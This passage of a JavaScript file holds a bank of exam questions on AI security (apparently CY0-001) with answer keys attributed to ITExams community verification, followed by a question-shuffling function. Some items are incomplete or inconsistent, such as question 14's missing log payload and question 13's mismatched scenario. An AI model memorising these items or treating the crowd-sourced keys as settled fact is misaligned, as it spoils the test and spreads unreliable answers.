      "D. Masking"
    ],
    "answer": "C",
    "explanation": "Source: ITExams CY0-001 Question #2. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-3",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: AI-Assisted Security",
    "question": "A security engineer needs to monitor an AI-based system for runtime operations. The engineer is mostly concerned about the visibility of internal activity. Which of the following is the most appropriate monitoring solution?",
    "options": [
      "A. Deploying a security information and event management (SIEM) tool",
      "B. Implementing a web application firewall (WAF) with header logging",
      "C. Relying on vendor model controls and monitoring prompt inputs",
      "D. Enabling stack call and debugging level traces at the function level"
    ],
    "answer": "D",
    "explanation": "Source: ITExams CY0-001 Question #3. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-4",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: AI-Assisted Security",
    "question": "Which of the following should an auditor reference when reviewing a company’s human resources AI systems for legal non-compliance?",
    "options": [
      "A. Organization for Economic Cooperation and Development (OECD) standard",
      "B. National Institute of Standards and Technology (NIST) AI Risk Management Framework 9RMF)",
      "C. European Union (EU) AI Act",
      "D. International Organization for Standardization (ISO)"
    ],
    "answer": "C",
    "explanation": "Source: ITExams CY0-001 Question #4. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-5",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "An airline corporation wants to implement a chatbot application using a large language model (LLM) so its customers:\n\nCan ask question and receive answers about flight details.\n\nHave the option to upload files.\n\nWhich of the following security controls should the airline use to protect against malicious input and unauthorized use beyond the service-level agreement? (Choose two.)",
    "options": [
      "A. Prompt guardrails",
      "B. Role-based access controls",
      "C. Firewall rules",
      "D. Model token quotas"
    ],
    "answer": [
      "A",
      "D"
    ],
    "explanation": "Source: ITExams CY0-001 Question #5. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-6",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: AI-Assisted Security",
    "question": "A security operations center (SOC) has a very high volume of logs and alerts. The manager proposes the implementation of machine learning (ML) system to help with triage. Which of the following tasks is most suitable?",
    "options": [
      "A. Applying filters on specific alerts",
      "B. Automatically patching vulnerable systems",
      "C. Identifying and classifying alerts",
      "D. Summarizing the content of alerts"
    ],
    "answer": "C",
    "explanation": "Source: ITExams CY0-001 Question #6. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-7",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Basic AI Concepts Related to Cybersecurity",
    "question": "An organization recently created a custom model that integrates with a language model (LLM). The developer notices that the application programming interface (API) costs have increased. Which of the following is the best control to reduce cost?",
    "options": [
      "A. Implementing prompt templates",
      "B. Increasing central processing unit (CPU) and memory",
      "C. Reducing the model size",
      "D. Adjusting token limits"
    ],
    "answer": "D",
    "explanation": "Source: ITExams CY0-001 Question #7. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-8",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: AI-Assisted Security",
    "question": "A security administrator needs to improve an AI model. During an initial investigation, the administrator notices that two successive login features are recorded every day, and then a successful login occurs after a specific time interval. All the successful login attempts have been during office hours.\n\nWhich of the following techniques should the administrator use to improve the AI model’s security?",
    "options": [
      "A. Access management",
      "B. Pattern recognition",
      "C. Signature matching",
      "D. Vulnerability analysis"
    ],
    "answer": "B",
    "explanation": "Source: ITExams CY0-001 Question #8. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-9",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "Which of the following is the most concerning risk for a company that allows corporate end users to use public-facing large language models (LLMs)?",
    "options": [
      "A. Inaccuracies due to hallucinations",
      "B. Out-of-date acceptable use policies",
      "C. Data security regulatory violations",
      "D. Malicious code generation"
    ],
    "answer": "C",
    "explanation": "Source: ITExams CY0-001 Question #9. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-10",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "Which of the following requires developers to harden infrastructure to protect AI systems?",
    "options": [
      "A. Intake processes",
      "B. Acceptable use policies",
      "C. Development guidelines",
      "D. Configuration standards"
    ],
    "answer": "D",
    "explanation": "Source: ITExams CY0-001 Question #10. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-11",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "Which of the following is the best example of an AI model that is trained to identify multiple points from input using a neural network to provide output for authentication?",
    "options": [
      "A. Facial recognition",
      "B. Encryption key",
      "C. Open Authorization (OAuth)",
      "D. Bounding box"
    ],
    "answer": "A",
    "explanation": "Source: ITExams CY0-001 Question #11. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-12",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "An organization is developing and implementing AI features into a customer service application. Which of the following practices should the organization put the place before releasing the application for customer trials?",
    "options": [
      "A. Data masking and sanitization",
      "B. External compliance audits",
      "C. Approved AI vendor lists",
      "D. Third-party risk management"
    ],
    "answer": "A",
    "explanation": "Source: ITExams CY0-001 Question #12. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-13",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "An internal user enters a client credit card number into an internal generative machine learning (ML) model:\n\n#User prompt: Customer Jane Doe has a new credit card that she wants to add to her account. The number is 5555-5555-5555-5555\n\nWhich of the following is the most effective way to prevent prompt injection attacks against a large language model (LLM)?",
    "options": [
      "A. Guardrails",
      "B. Antivirus",
      "C. Web application firewall (WAF)",
      "D. Role-based access control"
    ],
    "answer": "A",
    "explanation": "Source: ITExams CY0-001 Question #13. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-14",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "A security alert triggers an agentic system. An analyst notices the following payload in the logs”\n\nThe alert includes multiple shell commands that are not typically run as part of any hardening. Which of the following is the most effective control to implement?",
    "options": [
      "A. Adding logic that includes approved strings before running the shell commands",
      "B. Deprecating model usage and retaining the model with safer parameters",
      "C. Modifying the application to ignore the SECURITY_UPDATE tag",
      "D. Using only approved libraries when interacting with agentic systems"
    ],
    "answer": "A",
    "explanation": "Source: ITExams CY0-001 Question #14. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-15",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: AI-Assisted Security",
    "question": "A global security operations center (SOC) wants to adapt and leverage the strength of AI in order to enhance its security operations. Which of the following is the best way to enhance the global SOC functions?",
    "options": [
      "A. Generate code and execute in production to help save time.",
      "B. Enable a personal assistant that can act in the global SOC with no human intervention.",
      "C. Use open-source models in production to help the efficiency of threat detection and threat analysis.",
      "D. Summarize alerts to easily gain insights on the environment."
    ],
    "answer": "D",
    "explanation": "Source: ITExams CY0-001 Question #15. Community-verified answer.",
    "image": null
  }
];

function generateFullQuestionBank(baseQuestions, targetCount = 85) {
  const seen = new Set();
  const unique = baseQuestions.filter(q => {
    if (seen.has(q.id)) return false;
    seen.add(q.id);
    return true;
  });

  const shuffled = shuffleArrayInternal([...unique]);
  return shuffled.slice(0, Math.min(targetCount, shuffled.length));
}

function shuffleArrayInternal(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

if (typeof module !== "undefined" && module.exports) {
  module.exports = { CYSA_QUESTIONS, SECAI_QUESTIONS, generateFullQuestionBank };
}
